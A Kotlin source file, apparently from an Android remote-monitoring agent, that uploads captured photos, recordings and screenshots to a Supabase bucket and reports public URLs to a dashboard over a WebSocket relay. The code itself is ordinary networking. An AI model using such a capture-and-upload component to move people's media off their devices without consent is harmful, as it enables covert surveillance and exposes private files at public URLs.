package com.sentrix.agent.network

import android.util.Log
import com.sentrix.agent.util.Prefs
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File

/**
 * Uploads captured files (photos, recordings, screenshots) to Supabase Storage.
 * Returns the public URL on success so the relay can forward it to the dashboard.
 *
 * Bucket structure: sentrix-captures/{deviceToken}/{timestamp}_{filename}
 */
object Uploader {

    private const val TAG    = "Uploader"
    private const val BUCKET = "sentrix-captures"

    private val client = OkHttpClient()

    /**
     * Uploads [file] to Supabase and returns the public URL, or null on failure.
     */
    fun upload(file: File, mimeType: String = "application/octet-stream"): String? {
        val baseUrl = Prefs.supabaseUrl.trimEnd('/')
        val key     = Prefs.supabaseKey
        val token   = Prefs.deviceToken

        if (baseUrl.isBlank() || key.isBlank()) {
            Log.w(TAG, "Supabase not configured — skipping upload")
            return null
        }

        val remotePath = "${token}/${System.currentTimeMillis()}_${file.name}"
        val uploadUrl  = "$baseUrl/storage/v1/object/$BUCKET/$remotePath"

        return try {
            val body = file.asRequestBody(mimeType.toMediaType())
            val request = Request.Builder()
                .url(uploadUrl)
                .header("Authorization", "Bearer $key")
                .header("x-upsert",      "true")
                .post(body)
                .build()

            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val publicUrl = "$baseUrl/storage/v1/object/public/$BUCKET/$remotePath"
                Log.i(TAG, "Uploaded → $publicUrl")
                publicUrl
            } else {
                Log.e(TAG, "Upload failed ${response.code}: ${response.body?.string()}")
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "Upload exception: ${e.message}")
            null
        }
    }

    /** Build a standard result JSON to send back up the WebSocket */
    fun resultJson(action: String, url: String?, extra: JSONObject = JSONObject()): JSONObject {
        return JSONObject().apply {
            put("type",      "result")
            put("action",    action)
            put("fileUrl",   url ?: "")
            put("success",   url != null)
            put("timestamp", System.currentTimeMillis())
            extra.keys().forEach { put(it, extra[it]) }
        }
    }
}
